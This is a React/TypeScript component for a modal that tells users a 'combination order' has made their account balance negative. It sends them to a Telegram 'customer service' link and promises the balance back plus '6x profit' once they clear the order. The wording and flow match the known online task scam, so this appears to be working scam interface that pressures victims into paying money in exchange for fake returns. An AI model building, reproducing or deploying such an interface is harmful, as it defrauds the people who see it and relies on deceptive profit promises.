import React from 'react';
import { AlertTriangle, MessageCircle, X } from 'lucide-react';
import { useAppContext } from '@/contexts/AppContext';

interface CombinationOrderModalProps {
  isOpen: boolean;
  onClose: () => void;
}

const CombinationOrderModal: React.FC<CombinationOrderModalProps> = ({ isOpen, onClose }) => {
  const { user, clearCombinationOrder } = useAppContext();

  if (!isOpen || !user?.has_pending_order) return null;

  const handleContactSupport = () => {
    window.open('https://t.me/EARNINGSLLCONLINECS1', '_blank');
  };

  const handleClearOrder = async () => {
    const success = await clearCombinationOrder();
    if (success) {
      onClose();
    }
  };

  return (
    <div className="fixed inset-0 bg-black/50 backdrop-blur-sm z-50 flex items-center justify-center p-4">
      <div className="bg-gray-900 border border-red-500/20 rounded-2xl p-6 max-w-md w-full mx-4">
        {/* Header */}
        <div className="flex items-center justify-between mb-4">
          <div className="flex items-center gap-3">
            <div className="w-12 h-12 rounded-xl bg-red-500/20 flex items-center justify-center">
              <AlertTriangle size={24} className="text-red-400" />
            </div>
            <div>
              <h2 className="text-xl font-bold text-white">Combination Order Detected</h2>
              <p className="text-sm text-gray-400">Your account encountered a premium optimization product</p>
            </div>
          </div>
          <button
            onClick={onClose}
            className="w-8 h-8 rounded-lg bg-gray-800 hover:bg-gray-700 flex items-center justify-center transition-colors"
          >
            <X size={16} className="text-gray-400" />
          </button>
        </div>

        {/* Status */}
        <div className="bg-red-500/10 border border-red-500/20 rounded-xl p-4 mb-4">
          <div className="flex items-center gap-2 mb-2">
            <div className="w-2 h-2 bg-red-400 rounded-full animate-pulse"></div>
            <span className="text-sm font-medium text-red-400">Pending Order</span>
          </div>
          <p className="text-sm text-gray-300 mb-2">
            Your account balance is temporarily negative due to a combination order.
          </p>
          <div className="flex items-center justify-between bg-gray-800/50 rounded-lg p-2">
            <span className="text-xs text-gray-400">Pending Amount:</span>
            <span className="text-sm font-bold text-red-400">-${user.pending_amount.toFixed(2)}</span>
          </div>
        </div>

        {/* Instructions */}
        <div className="space-y-3 mb-6">
          <div className="flex items-start gap-3">
            <div className="w-6 h-6 rounded-full bg-blue-500/20 flex items-center justify-center flex-shrink-0 mt-0.5">
              <span className="text-xs font-bold text-blue-400">1</span>
            </div>
            <div>
              <p className="text-sm text-white font-medium">Contact Customer Service</p>
              <p className="text-xs text-gray-400">Get help clearing the combination order</p>
            </div>
          </div>
          <div className="flex items-start gap-3">
            <div className="w-6 h-6 rounded-full bg-amber-500/20 flex items-center justify-center flex-shrink-0 mt-0.5">
              <span className="text-xs font-bold text-amber-400">2</span>
            </div>
            <div>
              <p className="text-sm text-white font-medium">Clear the Order</p>
              <p className="text-xs text-gray-400">Restore balance and receive 6x profit</p>
            </div>
          </div>
        </div>

        {/* Actions */}
        <div className="grid grid-cols-2 gap-3">
          <button
            onClick={handleContactSupport}
            className="flex items-center justify-center gap-2 px-4 py-3 bg-blue-600 hover:bg-blue-500 text-white font-medium rounded-xl transition-colors"
          >
            <MessageCircle size={16} />
            Contact Support
          </button>
          <button
            onClick={handleClearOrder}
            className="flex items-center justify-center gap-2 px-4 py-3 bg-emerald-600 hover:bg-emerald-500 text-white font-medium rounded-xl transition-colors"
          >
            <AlertTriangle size={16} />
            Clear Order
          </button>
        </div>

        {/* Note */}
        <div className="mt-4 p-3 bg-gray-800/50 rounded-lg">
          <p className="text-xs text-gray-400 text-center">
            After clearing: Balance restored + 6x profit (${(user.pending_amount * 6).toFixed(2)})
          </p>
        </div>
      </div>
    </div>
  );
};

export default CombinationOrderModal;
